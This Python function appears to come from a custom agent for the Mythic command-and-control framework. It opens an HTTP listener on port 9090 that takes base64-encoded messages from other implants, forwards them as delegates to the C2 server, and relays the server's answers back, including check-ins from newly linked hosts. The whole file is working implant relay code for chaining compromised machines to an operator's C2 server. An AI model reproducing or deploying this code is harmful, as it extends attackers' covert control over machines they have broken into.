def p2p_server(task_id):

    from http.server import BaseHTTPRequestHandler, HTTPServer
    import threading

    class RequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            message = "Hello!"

            self.protocol_version = "HTTP/1.1"
            self.send_response(200)
            self.send_header("Content-Length", len(message))
            self.end_headers()

            self.wfile.write(bytes(message, "utf8"))
            return

        def do_POST(self):

            global delegates_aswers

            content_len = int(self.headers.get('content-length', 0))
            post_body = self.rfile.read(content_len)
            decode = base64.b64decode(post_body)
            decode = decode.decode("utf-8")

            received_uuid = str(decode)[:36]
            received_message = json.loads(decode[36:])

            print("\n--------------- CURRENT DELEGATE -----------------\n")
            print("Message = " + str(received_message))
            print("UUID = " + received_uuid)

            print("----------------------------------------------------------\n")


            encoded = to64(decode)

            if received_message["action"] == "checkin":
                delegate = {
                    "message": encoded,
                    "uuid": agent.PayloadUUID,
                    "c2_profile": "http"
                }
            else:
                delegate = {
                    "message": encoded,
                    "uuid": received_uuid,
                    "c2_profile": "http"
                }

            delegates.append(delegate)
            while delegates_aswers == []:
                pass

            print("\n--------------- CURRENT DELEGATE ANSWERS -----------------\n")
            for answer in delegates_aswers:
                message = base64.b64decode(answer['message'])
                message = message.decode("utf-8")
                message = message[36:]
                message = json.loads(message)

                print("Message = " + str(message))
                print("UUID = " + answer["uuid"])
                if "mythic_uuid" in answer:
                    print("Mythic_uuid = " + answer["mythic_uuid"])

            print("----------------------------------------------------------\n")

            if received_message["action"] == "checkin":
                for answer in delegates_aswers:
                    message = base64.b64decode(answer['message'])
                    message = message.decode("utf-8")
                    message = message[36:]
                    message = json.loads(message)
                    new_uuid = message["id"]
                    if message["action"] == "checkin":
                        message = answer['message']
                        self.protocol_version = "HTTP/1.1"
                        self.send_response(200)
                        self.send_header("Content-Length", len(message))
                        self.end_headers()
                        self.wfile.write(bytes(message, "utf8"))
                        delegates_aswers.remove(answer)

                        # response = {
                        #     "user_output": "Added edge",
                        #     "task_id": task_id,
                        #     "edges": [
                        #             {
                        #             "source": agent.UUID,
                        #             "destination": new_uuid,
                        #             "direction": 2,
                        #             "metadata": "",
                        #             "action": "add",
                        #             "c2_profile": "http"
                        #             }
                        #         ]
                        #     }
                        # responses.append(response)


            else:
                reply = False
                while not reply:
                    for answer in delegates_aswers:
                        message = base64.b64decode(answer['message'])
                        message = message.decode("utf-8")
                        message = message[36:]
                        message = json.loads(message)
                        if answer['uuid'] == received_uuid and message["action"] == received_message["action"]:
                            message = answer['message']
                            self.protocol_version = "HTTP/1.1"
                            self.send_response(200)
                            self.send_header("Content-Length", len(message))
                            self.end_headers()
                            self.wfile.write(bytes(message, "utf8"))
                            delegates_aswers.remove(answer)
                            reply = True


    def run():
        server = ('', 9090)
        httpd = HTTPServer(server, RequestHandler)
        thread = threading.Thread(target = httpd.serve_forever, daemon=True)
        thread.start()
    run()